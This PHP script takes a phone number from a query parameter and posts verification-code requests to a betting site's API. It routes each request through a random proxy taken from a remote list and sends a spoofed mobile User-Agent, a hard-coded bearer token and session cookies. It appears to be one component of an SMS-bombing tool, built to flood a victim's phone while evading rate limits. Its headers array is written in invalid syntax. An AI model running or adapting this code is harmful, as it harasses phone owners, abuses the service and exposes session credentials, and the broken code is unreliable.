<?php
// Get the phone number from the query parameter
$phone = $_GET['phone'] ?? null;

if (!$phone) {
    die("Phone number is required.");
}

// Fetch the proxy list
$proxyListUrl = "http://168.119.39.20/~pikachut/loder.txt";
$proxies = file($proxyListUrl, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

if (!$proxies) {
    die("Failed to fetch proxies.");
}

// Randomly select a proxy
$proxy = $proxies[array_rand($proxies)];

// Set up the cURL request
$url = 'https://khelabd88.com/api/bt/v1/user/getVerifyCodeByContactType';
$data = json_encode([
    "receiver" => $phone,
    "callingCode" => "880",
]);

$headers = [
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-mobile': '?1',
    
    
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eSI6MSwidW4iOiJuaXJvYmlzbm9vYiIsImV4cCI6MTczNjgwMjM3MSwiaWF0IjoxNzM2NzgwNzcxLCJ1YyI6OH0.DgsH5k1NLiEJD0_p39Mn4Sev1F0F0whusRBGYc3hrJU',
    
    
    'origin': 'https://khelabd88.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://khelabd88.com/bd/bn/member/new-profile-verify-phone',
    'accept-language': 'en-US,en;q=0.9',
    'Cookie': 'JSESSIONID=04206D19FD353E5EE13E2A89FD7C878B; route=inhouseweb02; intercom-device-id-wcxfcbz1=e2881bf2-83ed-4caa-9273-933e87eec185; intercom-id-wcxfcbz1=4cf76be2-6236-4fc7-a072-48412de91935; intercom-session-wcxfcbz1=dW50U0UybE11WEp6cXJmMEpJYkxNOFpLZ2U5OERxMlZ6VFBGZkcvZEo4ODd4YitlZlhUMXlUTWN0aUtBRG4xYy0tNXJvQkIxaVcvelBuOHBhMXJyano2UT09--251e3551aeb990214837fd5e521040582c40f279',
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo "cURL Error: " . curl_error($ch);
} else {
    echo "Response: " . $response;
}

curl_close($ch);
?>
